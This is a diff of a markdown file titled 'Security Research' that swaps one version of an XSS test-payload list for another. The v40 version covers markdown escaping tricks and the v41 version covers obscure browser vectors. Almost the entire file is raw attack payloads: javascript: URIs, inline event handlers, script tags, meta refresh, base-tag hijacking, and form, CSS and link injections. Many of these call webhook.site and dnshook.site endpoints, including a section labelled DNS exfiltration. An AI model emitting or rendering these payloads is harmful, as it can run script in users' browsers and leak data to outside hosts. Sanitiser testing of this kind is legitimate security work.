@@ -1,263 +1,248 @@
-# Security Research - v40
+# Security Research - v41
 
-## Advanced Markdown Edge Cases & Escaping
+## Obscure Attack Vectors & Browser-Specific Behaviors
 
-Testing complex escaping scenarios, nested markdown, and edge cases.
-
----
-
-### 1) Backslash Escaping Attacks
-
-\[test\](javascript:alert(1))
-
-\<script\>alert(1)\</script\>
-
-\![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/escaped-img.gif)
-
-[normal](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/normal-link)
+Testing lesser-known XSS vectors, browser quirks, and edge cases.
 
 ---
 
-### 2) HTML Entity Encoding in Markdown
+### 1) CSS Injection Attempts
 
-&#60;script&#62;alert(1)&#60;/script&#62;
+<style>body{background:url('https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/css-bg.gif')}</style>
 
-&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+<div style="background:url('https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/inline-bg.gif')">CSS bg</div>
 
-&lt;script&gt;alert(1)&lt;/script&gt;
+<div style="behavior:url(script.htc)">IE behavior</div>
 
-![img](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1))
+<div style="-moz-binding:url('test.xml#xss')">Firefox binding</div>
 
-<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Entity JS</a>
-
----
-
-### 3) Unicode Normalization
-
-<a href="j\u0061v\u0061script:alert(1)">Unicode escape JS</a>
-
-<a href="jаvаscript:alert(1)">Cyrillic а</a>
-
-<a href="ｊａｖａｓｃｒｉｐｔ:alert(1)">Fullwidth JS</a>
-
-![Cyrillic](hｔｔｐｓ://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/fullwidth.gif)
+<div style="list-style-image:url('https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/list-style.gif')">List style</div>
 
 ---
 
-### 4) Whitespace Injection
+### 2) Meta Tag Injection
 
-<a href="java
-script:alert(1)">Newline in protocol</a>
+<meta http-equiv="refresh" content="0;url=https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/meta-refresh">
 
-<a href="java	script:alert(1)">Tab in protocol</a>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
 
-<a href=" javascript:alert(1)">Leading space</a>
+<meta name="referrer" content="unsafe-url">
 
-<a href="javascript :alert(1)">Space before colon</a>
-
-<a href="\njavascript:alert(1)">Escaped newline</a>
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
 
 ---
 
-### 5) URL Fragment/Query Injection
+### 3) Link Tag Injection
 
-[Fragment](https://example.com#<script>alert(1)</script>)
+<link rel="stylesheet" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/style.css">
 
-[Query XSS](https://example.com?q=<script>alert(1)</script>)
+<link rel="icon" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/favicon.ico">
 
-![Fragment img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/fragment.gif#<script>)
+<link rel="prefetch" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/prefetch.html">
 
-![Query img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/query.gif?xss=<script>)
+<link rel="dns-prefetch" href="//prefetch.6c53ebc7-83d8-4172-9cfa-78099857331c.dnshook.site">
 
----
-
-### 6) Reference Links Abuse
-
-[Click me][xss]
-
-[xss]: javascript:alert(1)
-
-[Click me 2][xss2]
-
-[xss2]: https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/ref-link.gif "<script>alert(1)</script>"
-
-[Image ref][imgref]
-
-[imgref]: https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/img-ref.gif
+<link rel="preconnect" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c">
 
 ---
 
-### 7) Nested Markdown Constructs
+### 4) Base Tag Hijacking
 
-**bold _italic **nested** close_ end**
+<base href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/">
 
-***bold italic [link](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/nested-format.gif) text***
+[relative link after base](test.gif)
 
-~~strikethrough **with bold** and _italic_~~
-
-> Blockquote with ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/blockquote.gif)
-> And <script>alert(1)</script>
+![relative img after base](img.gif)
 
 ---
 
-### 8) Code Block Escaping
+### 5) Object/Embed/Applet
 
-```html
-<script>alert('code block')</script>
-```
+<object data="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/object.swf"></object>
 
-    <script>alert('indented code')</script>
+<embed src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/embed.swf"></embed>
 
-```
-![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/inside-code.gif)
-```
+<applet code="test" codebase="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/"></applet>
 
 ---
 
-### 9) List Item XSS
+### 6) XML/XHTML Specific
 
-- Normal item
-- <script>alert('list item')</script>
-- ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/list-item.gif)
-- [link](javascript:alert(1))
+<xml id="test"><x><script>alert(1)</script></x></xml>
 
-1. Ordered item
-2. <script>alert('ordered')</script>
-3. ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/ordered-item.gif)
+<import implementation="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/test.html">
+
+<?xml version="1.0"?><script>alert(1)</script>
 
 ---
 
-### 10) Definition List Style (if supported)
+### 7) HTML5 Form Features
 
-Term 1
-: Definition with <script>alert(1)</script>
+<form action="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/form" method="GET">
+<input type="text" name="test" autofocus onfocus="alert(1)">
+<button formaction="javascript:alert(1)">Submit</button>
+</form>
 
-Term 2
-: Definition with ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/definition.gif)
+<input type="image" src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/input-img.gif">
 
----
-
-### 11) Checkbox/Task List XSS
-
-- [ ] Unchecked <script>alert(1)</script>
-- [x] Checked ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/checkbox.gif)
-- [ ] <a href="javascript:alert(1)">JS link in task</a>
+<button type="submit" formaction="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/button">Button</button>
 
 ---
 
-### 12) Footnote XSS (if supported)
+### 8) Frameset/Frame
 
-Text with footnote[^1]
+<frameset><frame src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/frame.html"></frame></frameset>
 
-[^1]: Footnote content <script>alert('footnote')</script> ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/footnote.gif)
-
-Another footnote[^xss]
-
-[^xss]: javascript:alert(1)
+<frame src="javascript:alert(1)">
 
 ---
 
-### 13) Table Cell Edge Cases
+### 9) Math ML Advanced
 
-| Header | XSS |
-|--------|-----|
-| Cell | `<script>` in code |
-| <img src=x onerror=alert(1)> | Error handler |
-| <a href="javascript:void(0)">void</a> | Void JS |
-| ![](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/table-cell.gif) | Image |
+<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">Click</maction></math>
 
----
+<math><annotation-xml encoding="application/xhtml+xml"><img src="x" onerror="alert(1)"></annotation-xml></math>
 
-### 14) Mixed HTML and Markdown
-
-<div>
-
-**Bold inside div**
-
-![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/div-img.gif)
-
-</div>
-
-<p>Paragraph with ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/p-img.gif)</p>
-
-<span onclick="alert(1)">Click span</span>
+<math xlink:href="javascript:alert(1)">Math XLink</math>
 
 ---
 
-### 15) URL Scheme Variations
+### 10) Attribute Breakout
 
-<a href="JAVASCRIPT:alert(1)">Uppercase JS</a>
+<img src="test.gif" alt="" onload="alert(1)" ">
 
-<a href="JaVaScRiPt:alert(1)">Mixed case JS</a>
+<a href="test" " onclick="alert(1)">Breakout link</a>
 
-<a href="vbscript:msgbox(1)">VBScript</a>
+<div title='test' onclick='alert(1)'>Div breakout</div>
 
-<a href="VBScript:msgbox(1)">Uppercase VBS</a>
-
-<a href="data:text/html,<script>alert(1)</script>">Data HTML</a>
-
-<a href="DATA:text/html,<script>alert(1)</script>">Uppercase data</a>
+<img src=`https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/backtick.gif`>
 
 ---
 
-### 16) SVG in Markdown Link
+### 11) Unicode Tricks (Advanced)
 
-![SVG](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.svg)
+<a href="javascript:alert(1)">Control char prefix</a>
 
-[![SVG Link](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.svg)](javascript:alert(1))
+<a href="\u006aavascript:alert(1)">JSON escape</a>
 
----
+<a href="&#1;javascript:alert(1)">Entity control char</a>
 
-### 17) Base64 Data URI
+<script\x00>alert(1)</script>
 
-<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<a href="jav​ascript:alert(1)">Zero-width space</a>
 
-![Base64](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)
-
----
-
-### 18) Protocol-Relative URLs
-
-![Proto relative](//webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/proto-relative.gif)
-
-<a href="//webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/proto-rel-link">Proto relative link</a>
+<a href="jav ascript:alert(1)">NBSP in protocol</a>
 
 ---
 
-### 19) Null Byte Injection
+### 12) Template/Slot Elements
 
-<a href="java%00script:alert(1)">Null in protocol</a>
+<template><script>alert(1)</script></template>
 
-![Null](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/null%00byte.gif)
+<template><img src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/template.gif"></template>
+
+<slot name="test"><script>alert(1)</script></slot>
 
 ---
 
-### 20) Raw HTML Event Handlers (Extended)
+### 13) Shadow DOM Escape (HTML)
 
-<body onload="alert(1)">
+<div><shadow><content><script>alert(1)</script></content></shadow></div>
 
-<div onmouseover="alert(1)">Hover me</div>
+<div><slot><script>alert(1)</script></slot></div>
 
-<input onfocus="alert(1)" autofocus>
+---
 
-<video autoplay onloadstart="alert(1)"><source src="x">
+### 14) Custom Elements
 
-<audio autoplay onloadstart="alert(1)"><source src="x">
+<custom-element onclick="alert(1)">Custom</custom-element>
 
-<marquee onstart="alert(1)">Marquee</marquee>
+<x-xss onclick="alert(1)">X-XSS</x-xss>
 
-<isindex action="javascript:alert(1)">
+<script-x>alert(1)</script-x>
+
+---
+
+### 15) Portal/Fenced Frame
+
+<portal src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/portal.html"></portal>
+
+<fencedframe src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/fenced.html"></fencedframe>
+
+---
+
+### 16) Deprecated/Obsolete Tags
+
+<bgsound src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/sound.wav">
+
+<listing><script>alert(1)</script></listing>
+
+<xmp><script>alert(1)</script></xmp>
+
+<plaintext><script>alert(1)</script>
+
+<blink onclick="alert(1)">Blink</blink>
+
+<spacer type="block" width="100" height="100">
+
+---
+
+### 17) Canvas XSS
+
+<canvas id="c" onclick="alert(1)"></canvas>
+
+<canvas id="c"><script>alert(1)</script></canvas>
+
+---
+
+### 18) Audio/Video Events
+
+<audio src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/audio.mp3" onloadstart="alert(1)">
+
+<video src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/video.mp4" onloadstart="alert(1)">
+
+<video poster="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/poster.gif"></video>
+
+<track src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/track.vtt" kind="subtitles">
+
+---
+
+### 19) Use XLink (SVG)
+
+<svg><use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"></use></svg>
+
+<svg><use href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/external.svg#test"></use></svg>
+
+---
+
+### 20) HTML Imports (deprecated)
+
+<link rel="import" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/import.html">
+
+---
+
+### 21) Manifest
+
+<html manifest="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/cache.manifest">
+
+---
+
+### 22) ARIA Attributes
+
+<div role="button" aria-label="<script>alert(1)</script>" onclick="alert(1)">ARIA</div>
+
+<img src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/aria.gif" aria-describedby="<script>">
 
 ---
 
 ### DNS Exfil
 
-![DNS](https://v40-dns.b4dc6012-cc6b-4692-a1a9-2a4a42693934.dnshook.site/dns.gif)
+![DNS](https://v41-dns.6c53ebc7-83d8-4172-9cfa-78099857331c.dnshook.site/dns.gif)
 
 ### Canary
 
-![Canary](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/v40-canary.gif)
+![Canary](https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/v41-canary.gif)
 
 ---
 
-*v40 - Advanced markdown edge cases*
+*v41 - Obscure attack vectors*
